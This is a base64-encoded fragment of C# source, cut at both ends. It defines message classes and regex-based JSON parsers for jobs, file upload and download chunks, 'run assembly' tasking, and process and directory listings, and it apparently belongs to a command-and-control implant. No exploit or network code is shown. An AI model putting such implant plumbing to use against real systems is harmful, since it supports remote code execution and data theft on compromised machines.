kNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlIG5ld19yZXNwb25zZSA9IG5ldyBSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVycm9yID0gcGFyc2VMaXN0WzJdDQogICAgICAgICAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgICAgICAgICAgICAgcmVzcG9uc2VzLkFkZChuZXdfcmVzcG9uc2UpOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgIGVsc2UgaWYgKHJlc3BvbnNlLkNvbnRhaW5zKCJmaWxlX2lkIikpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdCA9IFJlc3BvbnNlLlBhcnNlRXJyb3IocmVzcG9uc2UsIFJlc3BvbnNlRG93bmxvYWRGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAocGFyc2VMaXN0LkNvdW50ICE9IDMpIHsgcmV0dXJuIG51bGw7IH0NCiAgICAgICAgICAgICAgICAgICAgICAgIFJlc3BvbnNlIG5ld19yZXNwb25zZSA9IG5ldyBSZXNwb25zZQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0YXR1cyA9IHBhcnNlTGlzdFswXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzFdLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpbGVfaWQgPSBwYXJzZUxpc3RbMl0NCiAgICAgICAgICAgICAgICAgICAgICAgIH07DQogICAgICAgICAgICAgICAgICAgICAgICByZXNwb25zZXMuQWRkKG5ld19yZXNwb25zZSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICBwYXJzZUxpc3QgPSBSZXNwb25zZS5QYXJzZVN1Y2Nlc3MocmVzcG9uc2UgKyAifSIsIFJlc3BvbnNlU3VjY2Vzc0Zvcm1hdC5SZXBsYWNlKCJ7eyIsICJ7IikuUmVwbGFjZSgifX0iLCAifSIpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBhcnNlTGlzdC5BZGQoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAzKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgICAgICAgICBSZXNwb25zZSBuZXdfcmVzcG9uc2UgPSBuZXcgUmVzcG9uc2UNCiAgICAgICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzdGF0dXMgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFza19pZCA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlcnJvciA9IHBhcnNlTGlzdFsyXQ0KICAgICAgICAgICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcy5BZGQobmV3X3Jlc3BvbnNlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2VzOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIEpvYkxpc3QNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIGludCBqb2JfY291bnQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8Sm9iPiBqb2JzIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIEpvYkxpc3QoKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGpvYnMgPSBuZXcgTGlzdDxKb2I+KCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgSm9iDQogICAgICAgIHsNCiAgICAgICAgICAgIHB1YmxpYyBpbnQgam9iX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgYm9vbCBjb21wbGV0ZWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgam9iX3N0YXJ0ZWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgc3VjY2VzcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNvbW1hbmQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBwYXJhbWV0ZXJzIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcmVzcG9uc2UgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIFRocmVhZCB0aHJlYWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGJvb2wgdXBsb2FkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGRvd25sb2FkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBib29sIGNodW5raW5nX3N0YXJ0ZWQgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB0b3RhbF9jaHVua3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCBjaHVua19udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIGludCB3cml0ZV9udW0geyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBsb25nIGZpbGVfc2l6ZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHBhdGggeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIExpc3Q8c3RyaW5nPiBjaHVua3MgeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgSm9iKCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBjaHVua3MgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCg0KICAgICAgICBwdWJsaWMgY2xhc3MgVXBsb2FkVGFza2luZw0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFzc2VtYmx5X2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgcmVtb3RlX3BhdGggeyBnZXQ7IHNldDsgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBVcGxvYWRUYXNraW5nRm9ybWF0ID0gQCIiImFzc2VtYmx5X2lkIiI6ICIiezB9IiIsICIicmVtb3RlX3BhdGgiIjogIiJ7MX0iIiI7DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgTGlzdDxzdHJpbmc+IFBhcnNlKHN0cmluZyBkYXRhLCBzdHJpbmcgZm9ybWF0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIGZvcm1hdCA9IFJlZ2V4LkVzY2FwZShmb3JtYXQpLlJlcGxhY2UoIlxcIiwgQCIiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgTWF0Y2ggbWF0Y2ggPSBuZXcgUmVnZXgoZm9ybWF0KS5NYXRjaChkYXRhLlJlcGxhY2UoQCJcIiwgQCIiKSk7DQogICAgICAgICAgICAgICAgTGlzdDxzdHJpbmc+IG1hdGNoZXMgPSBuZXcgTGlzdDxzdHJpbmc+KCk7DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDEiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBVcGxvYWRUYXNraW5nIEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBVcGxvYWRUYXNraW5nLlBhcnNlKG1lc3NhZ2UsIFVwbG9hZFRhc2tpbmdGb3JtYXQpOw0KICAgICAgICAgICAgICAgIGlmIChwYXJzZUxpc3QuQ291bnQgIT0gMikgeyByZXR1cm4gbnVsbDsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBuZXcgVXBsb2FkVGFza2luZw0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYXNzZW1ibHlfaWQgPSBwYXJzZUxpc3RbMF0sDQogICAgICAgICAgICAgICAgICAgIHJlbW90ZV9wYXRoID0gcGFyc2VMaXN0WzFdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBSdW5Bc3NlbWJseQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFyZ3MgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBhc3NlbWJseV9pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFJ1bkFzc2VtYmx5Rm9ybWF0ID0gQCIiImFzc2VtYmx5X2lkIiI6ICIiezB9IiIsICIiYXJncyIiOiAiInsxfSIiIjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBMaXN0PHN0cmluZz4gUGFyc2Uoc3RyaW5nIGRhdGEsIHN0cmluZyBmb3JtYXQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZm9ybWF0ID0gUmVnZXguRXNjYXBlKGZvcm1hdCkuUmVwbGFjZSgiXFwiLCBAIiIpOw0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInswfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MH0iLCAiKD8nZ3JvdXAwJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezF9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsxfSIsICIoPydncm91cDEnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIHJldHVybiBtYXRjaGVzOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIFJ1bkFzc2VtYmx5IEZyb21Kc29uKHN0cmluZyBtZXNzYWdlKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIExpc3Q8c3RyaW5nPiBwYXJzZUxpc3QgPSBSdW5Bc3NlbWJseS5QYXJzZShtZXNzYWdlLCBSdW5Bc3NlbWJseUZvcm1hdCk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSAyKSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBSdW5Bc3NlbWJseQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYXJncyA9IHBhcnNlTGlzdFsxXSwNCiAgICAgICAgICAgICAgICAgICAgYXNzZW1ibHlfaWQgPSBwYXJzZUxpc3RbMF0NCiAgICAgICAgICAgICAgICB9Ow0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFVwbG9hZA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX3NpemUgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBpbnQgY2h1bmtfbnVtIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgZnVsbF9wYXRoIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgSnNvbkZvcm1hdCA9IEAie3siImFjdGlvbiIiOiIiezB9IiIsIiJjaHVua19zaXplIiI6ezF9LCIiZmlsZV9pZCIiOiIiezJ9IiIsIiJjaHVua19udW0iIjp7M30sICIiZnVsbF9wYXRoIiI6ICIiezR9IiIsIiJ0YXNrX2lkIiI6IiJ7NX0iIn19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKFVwbG9hZCB1cGxvYWQpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgcmV0dXJuIFN0cmluZy5Gb3JtYXQoDQogICAgICAgICAgICAgICAgICAgIHVwbG9hZC5Kc29uRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5hY3Rpb24pLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5jaHVua19zaXplLlRvU3RyaW5nKCkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5maWxlX2lkKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZSh1cGxvYWQuY2h1bmtfbnVtLlRvU3RyaW5nKCkpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC5mdWxsX3BhdGgpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHVwbG9hZC50YXNrX2lkKQ0KICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgDQogICAgICAgIHB1YmxpYyBjbGFzcyBVcGxvYWRSZXNwb25zZQ0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGFjdGlvbiB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHRvdGFsX2NodW5rcyB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IGNodW5rX251bSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIGNodW5rX2RhdGEgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBmaWxlX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgdGFza19pZCB7IGdldDsgc2V0OyB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFVwbG9hZFJlc3BvbnNlRm9ybWF0ID0gQCJ7eyIiYWN0aW9uIiI6ICIiezB9IiIsICIidG90YWxfY2h1bmtzIiI6IHsxfSwgIiJjaHVua19udW0iIjogezJ9LCAiImNodW5rX2RhdGEiIjogIiJ7M30iIiwgIiJmaWxlX2lkIiI6ICIiezR9IiIsICIidGFza19pZCIiOiAiIns1fSIifX0iOw0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIExpc3Q8c3RyaW5nPiBQYXJzZShzdHJpbmcgZGF0YSwgc3RyaW5nIGZvcm1hdCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBmb3JtYXQgPSBSZWdleC5Fc2NhcGUoZm9ybWF0KS5SZXBsYWNlKCJcXHsiLCBAInsiKTsNCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7MH0iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezB9IiwgIig\/J2dyb3VwMCcuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoInsxfSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7MX0iLCAiKD8nZ3JvdXAxJy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezJ9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoInsyfSIsICIoPydncm91cDInLiopIik7IH0NCiAgICAgICAgICAgICAgICBpZiAoZm9ybWF0LkNvbnRhaW5zKCJ7M30iKSkgeyBmb3JtYXQgPSBmb3JtYXQuUmVwbGFjZSgiezN9IiwgIig\/J2dyb3VwMycuKikiKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChmb3JtYXQuQ29udGFpbnMoIns0fSIpKSB7IGZvcm1hdCA9IGZvcm1hdC5SZXBsYWNlKCJ7NH0iLCAiKD8nZ3JvdXA0Jy4qKSIpOyB9DQogICAgICAgICAgICAgICAgaWYgKGZvcm1hdC5Db250YWlucygiezV9IikpIHsgZm9ybWF0ID0gZm9ybWF0LlJlcGxhY2UoIns1fSIsICIoPydncm91cDUnLiopIik7IH0NCiAgICAgICAgICAgICAgICBNYXRjaCBtYXRjaCA9IG5ldyBSZWdleChmb3JtYXQpLk1hdGNoKGRhdGEuUmVwbGFjZShAIlwiLCBAIiIpKTsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gbWF0Y2hlcyA9IG5ldyBMaXN0PHN0cmluZz4oKTsNCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDAiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAwIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXAxIl0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwMSJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwMiJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDIiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICBpZiAobWF0Y2guR3JvdXBzWyJncm91cDMiXSAhPSBudWxsKSB7IG1hdGNoZXMuQWRkKG1hdGNoLkdyb3Vwc1siZ3JvdXAzIl0uVmFsdWUpOyB9DQogICAgICAgICAgICAgICAgaWYgKG1hdGNoLkdyb3Vwc1siZ3JvdXA0Il0gIT0gbnVsbCkgeyBtYXRjaGVzLkFkZChtYXRjaC5Hcm91cHNbImdyb3VwNCJdLlZhbHVlKTsgfQ0KICAgICAgICAgICAgICAgIGlmIChtYXRjaC5Hcm91cHNbImdyb3VwNSJdICE9IG51bGwpIHsgbWF0Y2hlcy5BZGQobWF0Y2guR3JvdXBzWyJncm91cDUiXS5WYWx1ZSk7IH0NCiAgICAgICAgICAgICAgICByZXR1cm4gbWF0Y2hlczsNCiAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBVcGxvYWRSZXNwb25zZSBGcm9tSnNvbihzdHJpbmcgbWVzc2FnZSkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBMaXN0PHN0cmluZz4gcGFyc2VMaXN0ID0gVXBsb2FkUmVzcG9uc2UuUGFyc2UobWVzc2FnZSwgVXBsb2FkUmVzcG9uc2VGb3JtYXQuUmVwbGFjZSgie3siLCAieyIpLlJlcGxhY2UoIn19IiwgIn0iKSk7DQogICAgICAgICAgICAgICAgaWYgKHBhcnNlTGlzdC5Db3VudCAhPSA2KSB7IHJldHVybiBudWxsOyB9DQogICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBVcGxvYWRSZXNwb25zZQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgYWN0aW9uID0gcGFyc2VMaXN0WzBdLA0KICAgICAgICAgICAgICAgICAgICB0b3RhbF9jaHVua3MgPSBJbnQzMi5QYXJzZShwYXJzZUxpc3RbMV0pLA0KICAgICAgICAgICAgICAgICAgICBjaHVua19udW0gPSBJbnQzMi5QYXJzZShwYXJzZUxpc3RbMl0pLA0KICAgICAgICAgICAgICAgICAgICBjaHVua19kYXRhID0gcGFyc2VMaXN0WzNdLA0KICAgICAgICAgICAgICAgICAgICBmaWxlX2lkID0gcGFyc2VMaXN0WzRdLA0KICAgICAgICAgICAgICAgICAgICB0YXNrX2lkID0gcGFyc2VMaXN0WzVdDQogICAgICAgICAgICAgICAgfTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHB1YmxpYyBjbGFzcyBQcm9jZXNzTGlzdA0KICAgICAgICB7DQogICAgICAgICAgICBwdWJsaWMgTGlzdDxQcm9jZXNzPiBwcm9jZXNzX2xpc3QgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIFByb2Nlc3NMaXN0KCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBwcm9jZXNzX2xpc3QgPSBuZXcgTGlzdDxQcm9jZXNzPigpOw0KICAgICAgICAgICAgfQ0KDQogICAgICAgICAgICBwdWJsaWMgc3RhdGljIHN0cmluZyBUb0pzb24oUHJvY2Vzc0xpc3QgcHJvY2Vzc19saXN0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyByZXNwb25zZXMgPSAiIjsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKFByb2Nlc3MgcHJvY2VzcyBpbiBwcm9jZXNzX2xpc3QucHJvY2Vzc19saXN0KQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKChjb3VudCArIDEpID09IHByb2Nlc3NfbGlzdC5wcm9jZXNzX2xpc3QuQ291bnQpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyArPSBQcm9jZXNzLlRvSnNvbihwcm9jZXNzKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJlc3BvbnNlcyArPSBQcm9jZXNzLlRvSnNvbihwcm9jZXNzKSArICcsJzsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICArK2NvdW50Ow0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICByZXR1cm4gIlsiICsgcmVzcG9uc2VzICsgIl0iOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIFByb2Nlc3MNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIGludCBwcm9jZXNzX2lkIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgYXJjaGl0ZWN0dXJlIHsgZ2V0OyBzZXQ7IH0NCiAgICAgICAgICAgIHB1YmxpYyBzdHJpbmcgbmFtZSB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgc3RyaW5nIHVzZXIgeyBnZXQ7IHNldDsgfQ0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBiaW5fcGF0aCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgaW50IHBhcmVudF9wcm9jZXNzX2lkIHsgZ2V0OyBzZXQ7IH0NCg0KICAgICAgICAgICAgcHVibGljIHN0cmluZyBQcm9jZXNzRm9ybWF0ID0gQCJ7eyIicHJvY2Vzc19pZCIiOiB7MH0sICIiYXJjaGl0ZWN0dXJlIiI6ICIiezF9IiIsICIibmFtZSIiOiAiInsyfSIiLCAiInVzZXIiIjogIiJ7M30iIiwgIiJiaW5fcGF0aCIiOiAiIns0fSIiLCAiInBhcmVudF9wcm9jZXNzX2lkIiI6IHs1fX19IjsNCg0KICAgICAgICAgICAgcHVibGljIHN0YXRpYyBzdHJpbmcgVG9Kc29uKFByb2Nlc3MgcHJvY2VzcykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gU3RyaW5nLkZvcm1hdCgNCiAgICAgICAgICAgICAgICAgICAgcHJvY2Vzcy5Qcm9jZXNzRm9ybWF0LA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHByb2Nlc3MucHJvY2Vzc19pZC5Ub1N0cmluZygpKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShwcm9jZXNzLmFyY2hpdGVjdHVyZSksDQogICAgICAgICAgICAgICAgICAgIEphdmFTY3JpcHRTdHJpbmdFbmNvZGUocHJvY2Vzcy5uYW1lKSwNCiAgICAgICAgICAgICAgICAgICAgSmF2YVNjcmlwdFN0cmluZ0VuY29kZShwcm9jZXNzLnVzZXIpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHByb2Nlc3MuYmluX3BhdGgpLA0KICAgICAgICAgICAgICAgICAgICBKYXZhU2NyaXB0U3RyaW5nRW5jb2RlKHByb2Nlc3MucGFyZW50X3Byb2Nlc3NfaWQuVG9TdHJpbmcoKSkNCiAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIGNsYXNzIERpcmVjdG9yeUxpc3QNCiAgICAgICAgew0KICAgICAgICAgICAgcHVibGljIExpc3Q8RmlsZVN5c3RlbUVudHJ5PiBkaXJlY3RvcnlfbGlzdCB7IGdldDsgc2V0OyB9DQogICAgICAgICAgICBwdWJsaWMgRGlyZWN0b3J5TGlzdCgpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgZGlyZWN0b3J5X2xpc3QgPSBuZXcgTGlzdDxGaWxlU3lzdGVtRW50cnk+KCk7DQogICAgICAgICAgICB9DQoNCiAgICAgICAgICAgIHB1YmxpYyBzdGF0aWMgc3RyaW5nIFRvSnNvbihEaXJlY3RvcnlMaXN0IGRpcmVjdG9yeV9saXN0KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZyByZXNwb25zZXMgPSAiIjsNCiAgICAgICAgICAgICAgICBpbnQgY291bnQgPSAwOw0KICAgICAgICAgICAgICAgIGZvcmVhY2ggKEZpbGVTeXN0ZW1FbnRyeSBlbnRyeSBpbiBkaXJlY3RvcnlfbGlzdC5kaXJlY3RvcnlfbGlzdCkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGlmICgoY291bnQgKyAxKSA9PSBkaXJlY3RvcnlfbGlzdC5kaXJlY3RvcnlfbGlzdC5D